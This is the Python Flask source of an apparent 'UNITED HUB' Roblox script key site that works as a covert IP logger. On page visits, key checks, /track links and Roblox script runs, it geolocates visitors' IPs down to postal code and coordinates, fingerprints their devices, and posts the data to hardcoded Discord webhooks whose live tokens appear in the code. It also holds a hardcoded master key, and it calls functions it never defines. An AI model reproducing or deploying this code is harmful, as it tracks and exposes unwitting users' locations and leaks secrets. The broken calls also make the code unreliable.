import os
import logging
import requests
from flask import Flask, request, render_template, redirect, url_for, session
from werkzeug.middleware.proxy_fix import ProxyFix
from user_agents import parse
from datetime import datetime, timedelta
import hashlib
import time

# Configure logging
logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger(__name__)

# Create the app
from flask_sqlalchemy import SQLAlchemy

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///data.db'  # <- linha essencial
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False         # <- evita warnings

db = SQLAlchemy(app)  # se já existir no código, não adicione de novo

# Database configuration
app.config['SQLALCHEMY_DATABASE_URI'] = os.environ.get("DATABASE_URL")
app.config['SQLALCHEMY_ENGINE_OPTIONS'] = {
    "pool_recycle": 300,
    "pool_pre_ping": True,
}
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

# Discord webhook configuration - updated with new webhook
DISCORD_WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK_URL", "https://discord.com/api/webhooks/1396961102344097865/H3vvRcT3yYWPg4VKFwjaaqVqEe2dtnb21r3Ib7gCYbsRRkhqyARNxiakvIhACI8Rc1kf")
KEY_GENERATOR_WEBHOOK_URL = "https://discord.com/api/webhooks/1396961179624280234/tg6NSzLM1SKRvENJpUBRE2pJSKuEeCx02Gmg2ltT3m2_44DWyGdVQEeqsd7lqLb2JHaI"
DM_NOTIFICATION_WEBHOOK_URL = "https://discord.com/api/webhooks/1396969880242360360/XruAYI9J183iqMLLAg5L6qztulQ_rvphaz-Xd2BWhmYUifGqpcZa-Gx-C10VPUmFo51m"

# Secret key for API authentication
API_SECRET_KEY = os.getenv("API_SECRET_KEY", "your-secret-api-key-here")

# Dictionary to track recent notifications (IP + timestamp)
recent_notifications = {}

def should_send_notification(ip, notification_type, cooldown_minutes=5):
    """Check if we should send a notification based on cooldown"""
    key = f"{ip}_{notification_type}"
    current_time = time.time()
    
    # Clean old entries (older than 1 hour)
    keys_to_remove = []
    for k, timestamp in recent_notifications.items():
        if current_time - timestamp > 3600:  # 1 hour
            keys_to_remove.append(k)
    
    for k in keys_to_remove:
        del recent_notifications[k]
    
    # Check if we should send notification
    if key in recent_notifications:
        time_diff = current_time - recent_notifications[key]
        if time_diff < (cooldown_minutes * 60):  # Convert to seconds
            return False
    
    # Update timestamp
    recent_notifications[key] = current_time
    return True

def get_client_ip():
    """Get the real IP address of the client, considering proxies"""
    if request.headers.getlist("X-Forwarded-For"):
        ip = request.headers.getlist("X-Forwarded-For")[0].split(',')[0].strip()
    elif request.headers.get('X-Real-IP'):
        ip = request.headers.get('X-Real-IP')
    else:
        ip = request.remote_addr
    return ip

def get_detailed_location_info(ip_address):
    """Get comprehensive location information from multiple APIs"""
    location_data = {
        'ip': ip_address,
        'country': 'Desconhecido',
        'country_code': 'N/A',
        'region': 'Desconhecido', 
        'city': 'Desconhecido',
        'postal_code': 'N/A',
        'latitude': 'N/A',
        'longitude': 'N/A',
        'timezone': 'N/A',
        'isp': 'Desconhecido',
        'org': 'Desconhecido',
        'as_name': 'N/A',
        'formatted_location': 'Localização não disponível'
    }
    
    # Skip localhost/private IPs
    if ip_address in ['127.0.0.1', 'localhost'] or ip_address.startswith('192.168.') or ip_address.startswith('10.'):
        logger.info(f"Skipping location lookup for private IP: {ip_address}")
        location_data['formatted_location'] = 'IP Local/Privado'
        return location_data
    
    # Try multiple APIs for maximum data coverage (ordered by precision)
    apis_to_try = [
        {
            'name': 'IPGeolocation',
            'url': f'https://api.ipgeolocation.io/ipgeo?apiKey=free&ip={ip_address}&fields=*',
            'parser': 'ipgeo'
        },
        {
            'name': 'IP-API',
            'url': f'http://ip-api.com/json/{ip_address}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query,district',
            'parser': 'ipapi'
        },
        {
            'name': 'IPInfo',
            'url': f'https://ipinfo.io/{ip_address}/json',
            'parser': 'ipinfo'
        },
        {
            'name': 'IP2Location',
            'url': f'https://api.ip2location.io/?key=free&ip={ip_address}',
            'parser': 'ip2loc'
        }
    ]
    
    for api in apis_to_try:
        try:
            logger.info(f"Tentando {api['name']} para IP {ip_address}")
            response = requests.get(api['url'], timeout=10)
            
            if response.status_code == 200:
                data = response.json()
                
                if api['parser'] == 'ipgeo' and 'country_name' in data:
                    # IPGeolocation API (most detailed)
                    location_data.update({
                        'country': data.get('country_name', 'Desconhecido'),
                        'country_code': data.get('country_code2', 'N/A'),
                        'region': data.get('state_prov', 'Desconhecido'),
                        'city': data.get('city', 'Desconhecido'),
                        'postal_code': data.get('zipcode', 'N/A'),
                        'latitude': str(data.get('latitude', 'N/A')),
                        'longitude': str(data.get('longitude', 'N/A')),
                        'timezone': data.get('time_zone', {}).get('name', 'N/A') if isinstance(data.get('time_zone'), dict) else str(data.get('time_zone', 'N/A')),
                        'isp': data.get('isp', 'Desconhecido'),
                        'org': data.get('organization', 'Desconhecido'),
                        'as_name': data.get('connection_type', 'N/A')
                    })
                    
                    # Better location formatting
                    location_parts = []
                    if data.get('city'):
                        location_parts.append(data['city'])
                    if data.get('state_prov'):
                        location_parts.append(data['state_prov'])
                    if data.get('country_name'):
                        location_parts.append(data['country_name'])
                    
                    location_data['formatted_location'] = ', '.join(location_parts) if location_parts else 'Localização não disponível'
                    logger.info(f"Dados obtidos com sucesso de {api['name']} - CEP: {data.get('zipcode', 'N/A')}")
                    break
                    
                elif api['parser'] == 'ipapi' and data.get('status') == 'success':
                    location_data.update({
                        'country': data.get('country', 'Desconhecido'),
                        'country_code': data.get('countryCode', 'N/A'),
                        'region': data.get('regionName', 'Desconhecido'),
                        'city': data.get('city', 'Desconhecido'),
                        'postal_code': data.get('zip', 'N/A'),
                        'latitude': str(data.get('lat', 'N/A')),
                        'longitude': str(data.get('lon', 'N/A')),
                        'timezone': data.get('timezone', 'N/A'),
                        'isp': data.get('isp', 'Desconhecido'),
                        'org': data.get('org', 'Desconhecido'),
                        'as_name': data.get('as', 'N/A')
                    })
                    
                    # Format complete location
                    location_parts = []
                    if data.get('city') and data.get('city') != 'N/A':
                        location_parts.append(data['city'])
                    if data.get('regionName') and data.get('regionName') != 'N/A':
                        location_parts.append(data['regionName'])
                    if data.get('country') and data.get('country') != 'N/A':
                        location_parts.append(data['country'])
                    
                    location_data['formatted_location'] = ', '.join(location_parts) if location_parts else 'Localização não disponível'
                    logger.info(f"Dados obtidos com sucesso de {api['name']} - CEP: {data.get('zip', 'N/A')}")
                    break
                    
                elif api['parser'] == 'ipinfo' and 'city' in data:
                    loc = data.get('loc', 'N/A,N/A').split(',')
                    location_data.update({
                        'country': data.get('country', 'Desconhecido'),
                        'region': data.get('region', 'Desconhecido'),
                        'city': data.get('city', 'Desconhecido'),
                        'postal_code': data.get('postal', 'N/A'),
                        'latitude': loc[0] if len(loc) > 0 else 'N/A',
                        'longitude': loc[1] if len(loc) > 1 else 'N/A',
                        'timezone': data.get('timezone', 'N/A'),
                        'org': data.get('org', 'Desconhecido')
                    })
                    
                    # Format complete location
                    location_parts = []
                    if data.get('city'):
                        location_parts.append(data['city'])
                    if data.get('region'):
                        location_parts.append(data['region'])
                    if data.get('country'):
                        location_parts.append(data['country'])
                    
                    location_data['formatted_location'] = ', '.join(location_parts) if location_parts else 'Localização não disponível'
                    logger.info(f"Dados obtidos com sucesso de {api['name']} - CEP: {data.get('postal', 'N/A')}")
                    break
                    
                elif api['parser'] == 'ip2loc' and 'country_name' in data:
                    # IP2Location API
                    location_data.update({
                        'country': data.get('country_name', 'Desconhecido'),
                        'country_code': data.get('country_code', 'N/A'),
                        'region': data.get('region_name', 'Desconhecido'),
                        'city': data.get('city_name', 'Desconhecido'),
                        'postal_code': data.get('zip_code', 'N/A'),
                        'latitude': str(data.get('latitude', 'N/A')),
                        'longitude': str(data.get('longitude', 'N/A')),
                        'timezone': data.get('time_zone', 'N/A'),
                        'isp': data.get('isp', 'Desconhecido'),
                        'org': data.get('as', 'Desconhecido'),
                        'as_name': data.get('as', 'N/A')
                    })
                    
                    # Format complete location
                    location_parts = []
                    if data.get('city_name'):
                        location_parts.append(data['city_name'])
                    if data.get('region_name'):
                        location_parts.append(data['region_name'])
                    if data.get('country_name'):
                        location_parts.append(data['country_name'])
                    
                    location_data['formatted_location'] = ', '.join(location_parts) if location_parts else 'Localização não disponível'
                    logger.info(f"Dados obtidos com sucesso de {api['name']} - CEP: {data.get('zip_code', 'N/A')}")
                    break
                    
        except requests.exceptions.RequestException as e:
            logger.warning(f"Falha ao obter localização de {api['name']}: {str(e)}")
            continue
        except Exception as e:
            logger.error(f"Erro ao processar dados de {api['name']}: {str(e)}")
            continue
    
    return location_data

def get_comprehensive_device_info():
    """Get comprehensive device, browser, and system information"""
    try:
        user_agent_string = request.headers.get('User-Agent', '')
        user_agent = parse(user_agent_string)
        
        # Get OS info
        os_family = user_agent.os.family or 'Desconhecido'
        os_version = user_agent.os.version_string or 'N/A'
        
        # Get browser info
        browser_family = user_agent.browser.family or 'Desconhecido'
        browser_version = user_agent.browser.version_string or 'N/A'
        
        # Device detection
        device_type = "Móvel" if user_agent.is_mobile else "Desktop"
        if user_agent.is_tablet:
            device_type = "Tablet"
        elif user_agent.is_bot:
            device_type = "Bot/Crawler"
        
        # Format detailed OS info
        os_info = f"{os_family}"
        if os_version and os_version != 'N/A':
            os_info += f" {os_version}"
            
        # Format detailed browser info
        browser_info = f"{browser_family}"
        if browser_version and browser_version != 'N/A':
            browser_info += f" {browser_version}"
        
        # Get additional headers for more info
        headers_info = {}
        important_headers = [
            'Accept-Language', 'Accept-Encoding', 'Accept',
            'DNT', 'Connection', 'Upgrade-Insecure-Requests',
            'Sec-Fetch-Dest', 'Sec-Fetch-Mode', 'Sec-Fetch-Site',
            'X-Forwarded-For', 'X-Real-IP', 'CF-Connecting-IP'
        ]
        
        for header in important_headers:
            value = request.headers.get(header)
            if value:
                headers_info[header] = value
        
        # Screen resolution (if available from headers)
        screen_resolution = request.headers.get('Sec-CH-UA-Mobile', 'N/A')
        
        # Generate device fingerprint (simplified)
        fingerprint_data = f"{user_agent_string}_{request.headers.get('Accept-Language', '')}"
        device_fingerprint = hashlib.md5(fingerprint_data.encode()).hexdigest()[:12]
        
        return {
            'os': os_info,
            'os_family': os_family,
            'os_version': os_version,
            'browser': browser_info, 
            'browser_family': browser_family,
            'browser_version': browser_version,
            'device_type': device_type,
            'is_mobile': user_agent.is_mobile,
            'is_tablet': user_agent.is_tablet,
            'is_bot': user_agent.is_bot,
            'full_user_agent': user_agent_string,
            'device_fingerprint': device_fingerprint,
            'language': request.headers.get('Accept-Language', 'N/A'),
            'encoding': request.headers.get('Accept-Encoding', 'N/A'),
            'connection': request.headers.get('Connection', 'N/A'),
            'headers_info': headers_info
        }
    
    except Exception as e:
        logger.error(f"Failed to parse device info: {str(e)}")
        return {
            'os': 'Não identificado',
            'browser': 'Não identificado',
            'device_type': 'Não identificado',
            'full_user_agent': request.headers.get('User-Agent', 'N/A'),
            'device_fingerprint': 'N/A',
            'language': 'N/A',
            'encoding': 'N/A',
            'connection': 'N/A',
            'headers_info': {}
        }

def send_discord_webhook(username, ip_address, location, device_info):
    """Send data to Discord webhook"""
    try:
        content = f"""🔍 **Novo Acesso Registrado**
👤 **Usuário:** `{username}`
🌐 **IP:** `{ip_address}`
📍 **Localização:** `{location}`
💻 **Sistema:** `{device_info['os']}`
🌍 **Navegador:** `{device_info['browser']}`
📱 **Dispositivo:** `{device_info['device_type']}`"""

        payload = {
            "content": content,
            "username": "IP Logger Bot"
        }
        
        response = requests.post(DISCORD_WEBHOOK_URL, json=payload, timeout=10)
        response.raise_for_status()
        
        logger.info(f"Successfully sent webhook for user: {username}, IP: {ip_address}")
        return True
        
    except requests.exceptions.RequestException as e:
        logger.error(f"Failed to send Discord webhook: {str(e)}")
        return False

# Initialize database and models
from flask_sqlalchemy import SQLAlchemy
import secrets
import string

db = SQLAlchemy(app)

class VerificationKey(db.Model):
    __tablename__ = 'verification_keys'
    
    id = db.Column(db.Integer, primary_key=True)
    key_value = db.Column(db.String(32), unique=True, nullable=False)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    expires_at = db.Column(db.DateTime, nullable=False)
    used = db.Column(db.Boolean, default=False)
    used_at = db.Column(db.DateTime, nullable=True)
    used_ip = db.Column(db.String(45), nullable=True)
    used_location = db.Column(db.String(255), nullable=True)
    
    def __init__(self, duration_hours=24):
        self.key_value = self.generate_unique_key()
        self.expires_at = datetime.utcnow() + timedelta(hours=duration_hours)
    
    @staticmethod
    def generate_unique_key():
        """Generate a unique key that doesn't exist in database"""
        while True:
            # Generate a random key with uppercase letters and numbers
            key = ''.join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(16))
            # Check if key already exists
            if not VerificationKey.query.filter_by(key_value=key).first():
                return key
    
    def is_valid(self):
        """Check if key is valid (not used and not expired)"""
        now = datetime.utcnow()
        return not self.used and self.expires_at > now
    
    def use_key(self, ip_address=None, location=None):
        """Mark key as used"""
        self.used = True
        self.used_at = datetime.utcnow()
        self.used_ip = ip_address
        self.used_location = location
        db.session.commit()
    
    def time_remaining(self):
        """Get time remaining until expiration"""
        if self.expires_at > datetime.utcnow():
            return self.expires_at - datetime.utcnow()
        return timedelta(0)
    
    def __repr__(self):
        return f'<VerificationKey {self.key_value}>'

# Create database tables
with app.app_context():
    db.create_all()

@app.route('/')
def hub():
    """UNITED HUB verification page - main page"""
    
    # Get client info
    client_ip = get_client_ip()
    
    # Only send notification if enough time has passed (5 minutes cooldown)
    if should_send_notification(client_ip, "page_access", cooldown_minutes=5):
        location_data = get_detailed_location_info(client_ip)
        device_info = get_comprehensive_device_info()
        
        logger.info(f"Page access - IP: {client_ip}, Location: {location_data['formatted_location']}, OS: {device_info['os']}")
        
        # Send comprehensive notification for page access
        access_content = f"""🌐 **ACESSO DETECTADO - UNITED HUB**

🔍 **INFORMAÇÕES DE REDE**
🌍 **IP:** `{client_ip}`
📍 **Localização:** `{location_data['formatted_location']}`
🏙️ **Cidade:** `{location_data['city']}`
🏛️ **Estado/Região:** `{location_data['region']}`  
🌎 **País:** `{location_data['country']} ({location_data['country_code']})`
📮 **CEP:** `{location_data['postal_code']}`
📍 **Coordenadas:** `{location_data['latitude']}, {location_data['longitude']}`
🕰️ **Timezone:** `{location_data['timezone']}`
🌐 **ISP:** `{location_data['isp']}`
🏢 **Organização:** `{location_data['org']}`
🔗 **AS:** `{location_data['as_name']}`

💻 **INFORMAÇÕES DO DISPOSITIVO**
🖥️ **Sistema:** `{device_info['os']}`
🌐 **Navegador:** `{device_info['browser']}`
📱 **Tipo:** `{device_info['device_type']}`
🔍 **ID Único:** `{device_info['device_fingerprint']}`
🌍 **Idioma:** `{device_info['language']}`
📡 **Conexão:** `{device_info['connection']}`

⏰ **Timestamp:** `{datetime.utcnow().strftime('%d/%m/%Y %H:%M:%S')} UTC`
🎯 **Ação:** Acessou página de verificação UNITED HUB"""

        try:
            access_payload = {
                "content": access_content,
                "username": "UNITED HUB Monitor"
            }
            response = requests.post(DM_NOTIFICATION_WEBHOOK_URL, json=access_payload, timeout=10)
            response.raise_for_status()
            logger.info(f"Successfully sent comprehensive page access notification")
        except requests.exceptions.RequestException as e:
            logger.error(f"Failed to send page access webhook: {str(e)}")
    else:
        logger.debug(f"Skipped notification for IP {client_ip} due to cooldown")
    
    return render_template('hub.html')

@app.route('/admin')
def index():
    """Admin IP logger page"""
    return render_template('index.html')

@app.route('/verify', methods=['POST'])
def verify_key():
    """Verify access key for UNITED HUB"""
    key = request.form.get('key', '').strip()
    
    if not key:
        return render_template('denied.html'), 400
    
    # Get comprehensive user info for logging
    client_ip = get_client_ip()
    location_data = get_detailed_location_info(client_ip)
    device_info = get_comprehensive_device_info()
    
    # Check if key is the special master key
    if key == "SEMNEXO134":
        is_valid = True
        status = "✅ MASTER KEY VÁLIDA"
        logger.info(f"Master key used: SEMNEXO134 from IP {client_ip}")
    else:
        # Check if key exists in database
        verification_key = VerificationKey.query.filter_by(key_value=key).first()
        
        # Always log the attempt
        if verification_key:
            is_valid = verification_key.is_valid()
            status = "✅ VÁLIDA" if is_valid else "❌ INVÁLIDA/EXPIRADA"
            if is_valid:
                verification_key.use_key(client_ip, location_data['formatted_location'])
        else:
            is_valid = False
            status = "❌ NÃO ENCONTRADA"
    
    # Log the verification attempt
    logger.info(f"UNITED HUB verification - Key: {key}, Status: {status}, IP: {client_ip}")
    
    # Send comprehensive data to Discord webhook (always send, regardless of key validity)
    content = f"""🔑 **TENTATIVA DE VERIFICAÇÃO - UNITED HUB**

🎯 **KEY UTILIZADA:** `{key}`
🔍 **STATUS:** **{status}**

🔍 **DADOS COMPLETOS DO USUÁRIO**
🌍 **IP:** `{client_ip}`
📍 **Localização Completa:** `{location_data['formatted_location']}`
🏙️ **Cidade:** `{location_data['city']}`
🏛️ **Estado/Região:** `{location_data['region']}`  
🌎 **País:** `{location_data['country']} ({location_data['country_code']})`
📮 **CEP:** `{location_data['postal_code']}`
📍 **Coordenadas GPS:** `{location_data['latitude']}, {location_data['longitude']}`
🕰️ **Timezone:** `{location_data['timezone']}`
🌐 **Provedor (ISP):** `{location_data['isp']}`
🏢 **Organização:** `{location_data['org']}`
🔗 **AS Network:** `{location_data['as_name']}`

💻 **INFORMAÇÕES TÉCNICAS**
🖥️ **Sistema Operacional:** `{device_info['os']}`
🌐 **Navegador:** `{device_info['browser']}`
📱 **Tipo de Dispositivo:** `{device_info['device_type']}`
🔍 **Device Fingerprint:** `{device_info['device_fingerprint']}`
🌍 **Idioma do Sistema:** `{device_info['language']}`
📡 **Tipo de Conexão:** `{device_info['connection']}`

⏰ **Timestamp:** `{datetime.utcnow().strftime('%d/%m/%Y %H:%M:%S')} UTC`"""

    try:
        payload = {
            "content": content,
            "username": "UNITED HUB Security Bot"
        }
        response = requests.post(DISCORD_WEBHOOK_URL, json=payload, timeout=10)
        response.raise_for_status()
        logger.info(f"Successfully sent UNITED HUB webhook for key: {key}")
    except requests.exceptions.RequestException as e:
        logger.error(f"Failed to send UNITED HUB Discord webhook: {str(e)}")
    
    # Also send to DM notification webhook
    dm_content = f"""🔐 **VERIFICAÇÃO DE KEY DETECTADA**

🎯 **Key:** `{key}` | **Status:** {status}
🌍 **IP:** `{client_ip}`
📍 **Local:** `{location_data['formatted_location']}`
💻 **Sistema:** `{device_info['os']}`
🌐 **Navegador:** `{device_info['browser']}`
🔍 **Device ID:** `{device_info['device_fingerprint']}`
⏰ **Horário:** {datetime.utcnow().strftime('%d/%m/%Y %H:%M:%S')} UTC"""

    try:
        dm_payload = {
            "content": dm_content,
            "username": "Key Verification Monitor"
        }
        response = requests.post(DM_NOTIFICATION_WEBHOOK_URL, json=dm_payload, timeout=10)
        response.raise_for_status()
        logger.info(f"Successfully sent DM notification for site access: {key}")
    except requests.exceptions.RequestException as e:
        logger.error(f"Failed to send DM notification webhook: {str(e)}")
    
    # Return result based on key validity
    if is_valid:
        return render_template('verified.html')
    else:
        return render_template('denied.html'), 403

@app.route('/generate-key')
def generate_key():
    """Generate a new verification key (24 hours) - Public endpoint"""
    new_key = VerificationKey(duration_hours=24)
    db.session.add(new_key)
    db.session.commit()
    
    # Send key to Discord public channel
    expires_str = new_key.expires_at.strftime('%d/%m/%Y às %H:%M UTC')
    content = f"""🔑 **NOVA KEY GERADA**
🎯 **Key:** `{new_key.key_value}`
⏰ **Expira em:** {expires_str}
🕒 **Duração:** 24 horas"""

    try:
        payload = {
            "content": content,
            "username": "Key Generator Bot"
        }
        response = requests.post(KEY_GENERATOR_WEBHOOK_URL, json=payload, timeout=10)
        response.raise_for_status()
        logger.info(f"Successfully sent new key to Discord: {new_key.key_value}")
    except requests.exceptions.RequestException as e:
        logger.error(f"Failed to send key generation webhook: {str(e)}")
    
    return {
        'success': True,
        'key': new_key.key_value,
        'expires_at': new_key.expires_at.isoformat(),
        'message': 'Key gerada e enviada para Discord!'
    }

@app.route('/api/generate-private-key', methods=['POST'])
def generate_private_key():
    """Generate a private key for specific Discord user (for bot integration)"""
    
    # Check API authentication
    auth_header = request.headers.get('Authorization')
    if not auth_header or auth_header != f"Bearer {API_SECRET_KEY}":
        return {'error': 'Unauthorized'}, 401
    
    # Get user data from request
    data = request.get_json()
    if not data or 'user_id' not in data or 'username' not in data:
        return {'error': 'Missing user_id or username'}, 400
    
    user_id = data['user_id']
    username = data['username']
    
    # Generate new key
    new_key = VerificationKey(duration_hours=24)
    db.session.add(new_key)
    db.session.commit()
    
    # Log key generation
    logger.info(f"Private key generated for Discord user: {username} ({user_id}) - Key: {new_key.key_value}")
    
    expires_str = new_key.expires_at.strftime('%d/%m/%Y às %H:%M UTC')
    
    return {
        'success': True,
        'key': new_key.key_value,
        'expires_at': new_key.expires_at.isoformat(),
        'expires_formatted': expires_str,
        'user_id': user_id,
        'username': username,
        'message': f'Key privada gerada para {username}'
    }

@app.route('/cleanup-keys')
def cleanup_expired_keys():
    """Remove expired keys from database"""
    now = datetime.utcnow()
    expired_keys = VerificationKey.query.filter(VerificationKey.expires_at < now).all()
    count = len(expired_keys)
    
    for key in expired_keys:
        db.session.delete(key)
    
    db.session.commit()
    
    logger.info(f"Cleaned up {count} expired keys")
    
    return {
        'success': True,
        'cleaned_keys': count,
        'message': f'{count} keys expiradas removidas do banco'
    }

@app.route('/track')
def track_user():
    """Track user with parameter and send to Discord"""
    # Get the user parameter from URL
    username = request.args.get('user', '').strip()
    
    if not username:
        logger.warning("Access attempt without user parameter")
        return render_template('error.html', 
                             error_message="Missing 'user' parameter. Please add ?user=yourname to the URL"), 400
    
    # Get client IP
    client_ip = get_client_ip()
    
    # Get location info
    location = get_location_info(client_ip)
    
    # Get device info
    device_info = get_device_info()
    
    logger.info(f"Tracking user: {username}, IP: {client_ip}, Location: {location}, OS: {device_info['os']}")
    
    # Send to Discord webhook
    webhook_success = send_discord_webhook(username, client_ip, location, device_info)
    
    if webhook_success:
        return render_template('success.html', 
                             username=username, 
                             ip_address=client_ip,
                             location=location,
                             device_info=device_info)
    else:
        return render_template('error.html', 
                             error_message="Failed to send notification to Discord. Please try again later."), 500

@app.route('/track', methods=['POST'])
def track_user_post():
    """Handle POST requests to track endpoint"""
    # Get the user parameter from form data
    username = request.form.get('user', '').strip()
    
    if not username:
        logger.warning("POST access attempt without user parameter")
        return render_template('error.html', 
                             error_message="Missing 'user' parameter in form data"), 400
    
    # Get client IP
    client_ip = get_client_ip()
    
    # Get location info
    location = get_location_info(client_ip)
    
    # Get device info
    device_info = get_device_info()
    
    logger.info(f"Tracking user via POST: {username}, IP: {client_ip}, Location: {location}, OS: {device_info['os']}")
    
    # Send to Discord webhook
    webhook_success = send_discord_webhook(username, client_ip, location, device_info)
    
    if webhook_success:
        return render_template('success.html', 
                             username=username, 
                             ip_address=client_ip,
                             location=location,
                             device_info=device_info)
    else:
        return render_template('error.html', 
                             error_message="Failed to send notification to Discord. Please try again later."), 500

@app.errorhandler(404)
def not_found(error):
    """Handle 404 errors"""
    return render_template('error.html', 
                         error_message="Page not found. Use /track?user=yourname to log a user."), 404

@app.errorhandler(500)
def internal_error(error):
    """Handle 500 errors"""
    return render_template('error.html', 
                         error_message="Internal server error. Please try again later."), 500

@app.route('/api/roblox-execution', methods=['POST'])
def roblox_execution():
    """Receive data from Roblox script execution"""
    try:
        # Get Roblox player data
        roblox_data = request.get_json()
        
        if not roblox_data:
            return {"error": "No data received"}, 400
        
        # Get client info for additional tracking
        client_ip = get_client_ip()
        location_data = get_detailed_location_info(client_ip)
        device_info = get_comprehensive_device_info()
        
        # Create comprehensive Discord message
        content = f"""🎮 **SCRIPT ROBLOX EXECUTADO - UNITED HUB**

👤 **DADOS DO JOGADOR**
🆔 **Nome:** `{roblox_data.get('player_name', 'N/A')}`
📛 **Nome Display:** `{roblox_data.get('player_display_name', 'N/A')}`
🔢 **ID do Jogador:** `{roblox_data.get('player_id', 'N/A')}`
⏳ **Idade da Conta:** `{roblox_data.get('account_age', 'N/A')} dias`
💎 **Membership:** `{roblox_data.get('membership_type', 'N/A')}`

🎯 **DADOS DO JOGO**
🎮 **ID do Jogo:** `{roblox_data.get('game_id', 'N/A')}`
🏠 **Place ID:** `{roblox_data.get('place_id', 'N/A')}`
📝 **Nome do Jogo:** `{roblox_data.get('game_name', 'N/A')}`
🌐 **Server ID:** `{roblox_data.get('server_id', 'N/A')}`
🌍 **Região do Server:** `{roblox_data.get('server_region', 'N/A')}`

💻 **INFORMAÇÕES TÉCNICAS**
📱 **Plataforma:** `{roblox_data.get('platform', 'N/A')}`
📲 **Mobile:** `{'Sim' if roblox_data.get('is_mobile') else 'Não'}`
🎮 **Gamepad:** `{'Sim' if roblox_data.get('is_gamepad') else 'Não'}`
⌨️ **Teclado:** `{'Sim' if roblox_data.get('is_keyboard') else 'Não'}`
🥽 **VR:** `{'Sim' if roblox_data.get('is_vr') else 'Não'}`
🎨 **Qualidade Gráfica:** `{roblox_data.get('graphics_quality', 'N/A')}`
💾 **Uso de Memória:** `{roblox_data.get('memory_usage', 'N/A')} MB`

🌐 **LOCALIZAÇÃO REAL DO JOGADOR**
🌍 **IP:** `{client_ip}`
📍 **Localização Completa:** `{location_data['formatted_location']}`
🏙️ **Cidade:** `{location_data['city']}`
🏛️ **Estado/Região:** `{location_data['region']}`
🌎 **País:** `{location_data['country']} ({location_data['country_code']})`
📮 **CEP:** `{location_data['postal_code']}`
📍 **Coordenadas GPS:** `{location_data['latitude']}, {location_data['longitude']}`
🕰️ **Timezone:** `{location_data['timezone']}`
🌐 **Provedor (ISP):** `{location_data['isp']}`

💻 **DISPOSITIVO USADO**
🖥️ **Sistema:** `{device_info['os']}`
🌐 **Navegador:** `{device_info['browser']}`
📱 **Tipo:** `{device_info['device_type']}`
🔍 **Device ID:** `{device_info['device_fingerprint']}`

⏰ **Timestamp:** `{roblox_data.get('formatted_time', 'N/A')}`
🔥 **STATUS:** **SCRIPT EXECUTADO COM SUCESSO**"""

        # Send to Discord webhook
        try:
            payload = {
                "content": content,
                "username": "UNITED HUB - Roblox Monitor"
            }
            response = requests.post(DISCORD_WEBHOOK_URL, json=payload, timeout=10)
            response.raise_for_status()
            logger.info(f"Successfully sent Roblox execution notification for player {roblox_data.get('player_name')}")
        except requests.exceptions.RequestException as e:
            logger.error(f"Failed to send Roblox Discord webhook: {str(e)}")
        
        # Also send to DM webhook
        dm_content = f"""🎮 **NOVO SCRIPT EXECUTADO**

👤 **Jogador:** `{roblox_data.get('player_name')} ({roblox_data.get('player_id')})`
🎯 **Jogo:** `{roblox_data.get('game_name')} ({roblox_data.get('place_id')})`
🌍 **Localização:** `{location_data['formatted_location']}`
💻 **Dispositivo:** `{device_info['os']} - {roblox_data.get('platform')}`
⏰ **Horário:** `{roblox_data.get('formatted_time', datetime.utcnow().strftime('%d/%m/%Y %H:%M:%S'))}`"""

        try:
            dm_payload = {
                "content": dm_content,
                "username": "Roblox Script Monitor"
            }
            response = requests.post(DM_NOTIFICATION_WEBHOOK_URL, json=dm_payload, timeout=10)
            response.raise_for_status()
            logger.info(f"Successfully sent Roblox DM notification")
        except requests.exceptions.RequestException as e:
            logger.error(f"Failed to send Roblox DM webhook: {str(e)}")
        
        return {"status": "success", "message": "Data received and logged"}, 200
        
    except Exception as e:
        logger.error(f"Error processing Roblox data: {str(e)}")
        return {"error": "Internal server error"}, 500

if __name__ == "__main__":
    import os
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
